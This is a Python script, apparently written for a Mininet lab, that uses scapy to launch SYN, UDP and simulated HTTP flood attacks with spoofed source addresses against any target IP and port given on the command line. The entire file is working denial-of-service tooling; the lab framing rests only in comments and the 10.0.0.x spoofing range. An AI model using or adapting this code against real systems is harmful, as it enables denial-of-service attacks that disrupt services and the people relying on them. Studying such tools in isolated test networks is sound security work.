#!/usr/bin/env python3
# filepath: /home/garv/Desktop/Cyber-Security/mininet_attack.py
import sys
import time
import random
import socket
from scapy.all import send, IP, TCP, UDP
import os

def print_usage():
    print("Usage: python mininet_attack.py <attack_type> <target_ip> <target_port> [packets]")
    print("Attack types: syn, udp, http")
    print("Example: python mininet_attack.py syn 10.0.0.1 80 100")
    sys.exit(1)

def syn_flood(target_ip, target_port, num_packets=100):
    """Send TCP SYN packets to target to perform a SYN flood attack"""
    print(f"Starting SYN flood attack on {target_ip}:{target_port}")
    
    total_sent = 0
    for _ in range(num_packets):
        source_ip = f"10.0.0.{random.randint(5, 254)}"  # Spoof from non-existent Mininet hosts
        source_port = random.randint(1024, 65535)
        
        # Create SYN packet
        syn_packet = IP(src=source_ip, dst=target_ip) / \
                    TCP(sport=source_port, dport=target_port, flags="S")
        
        # Send packet
        send(syn_packet, verbose=0)
        total_sent += 1
        if total_sent % 10 == 0:
            print(f"Sent {total_sent} packets")
    
    print(f"Attack completed. Sent {total_sent} SYN packets to {target_ip}:{target_port}")

def udp_flood(target_ip, target_port, num_packets=100):
    """Send UDP packets to target to perform a UDP flood attack"""
    print(f"Starting UDP flood attack on {target_ip}:{target_port}")
    
    # Generate random payload
    payload = os.urandom(1024)  # 1KB payload
    
    total_sent = 0
    for _ in range(num_packets):
        source_ip = f"10.0.0.{random.randint(5, 254)}"  # Spoof from non-existent Mininet hosts
        source_port = random.randint(1024, 65535)
        
        # Create UDP packet
        udp_packet = IP(src=source_ip, dst=target_ip) / \
                    UDP(sport=source_port, dport=target_port) / \
                    payload
        
        # Send packet
        send(udp_packet, verbose=0)
        total_sent += 1
        if total_sent % 10 == 0:
            print(f"Sent {total_sent} packets")
    
    print(f"Attack completed. Sent {total_sent} UDP packets to {target_ip}:{target_port}")

def http_flood(target_ip, target_port, num_packets=100):
    """Simulate HTTP flood by sending TCP packets to HTTP port"""
    print(f"Starting HTTP flood simulation on {target_ip}:{target_port}")
    
    # HTTP paths to request
    paths = ['/', '/index.html', '/about', '/contact', '/products', '/services']
    
    total_sent = 0
    for _ in range(num_packets):
        source_ip = f"10.0.0.{random.randint(5, 254)}"  # Spoof from non-existent Mininet hosts
        source_port = random.randint(1024, 65535)
        
        # Create HTTP GET request packet (TCP SYN followed by fake HTTP data)
        path = random.choice(paths)
        http_data = f"GET {path} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
        
        # Send SYN packet first
        syn_packet = IP(src=source_ip, dst=target_ip) / \
                    TCP(sport=source_port, dport=target_port, flags="S")
        
        send(syn_packet, verbose=0)
        
        # Send data packet (this is simplified and won't establish a real connection)
        http_packet = IP(src=source_ip, dst=target_ip) / \
                    TCP(sport=source_port, dport=target_port, flags="PA") / \
                    http_data
        
        send(http_packet, verbose=0)
        total_sent += 1
        if total_sent % 10 == 0:
            print(f"Sent {total_sent} HTTP requests")
    
    print(f"Attack completed. Sent {total_sent} HTTP requests to {target_ip}:{target_port}")

def main():
    if len(sys.argv) < 4:
        print_usage()
    
    attack_type = sys.argv[1].lower()
    target_ip = sys.argv[2]
    target_port = int(sys.argv[3])
    
    # Default to 100 packets if not specified
    num_packets = int(sys.argv[4]) if len(sys.argv) > 4 else 100
    
    if attack_type == "syn":
        syn_flood(target_ip, target_port, num_packets)
    elif attack_type == "udp":
        udp_flood(target_ip, target_port, num_packets)
    elif attack_type == "http":
        http_flood(target_ip, target_port, num_packets)
    else:
        print(f"Unknown attack type: {attack_type}")
        print_usage()

if __name__ == "__main__":
    main()
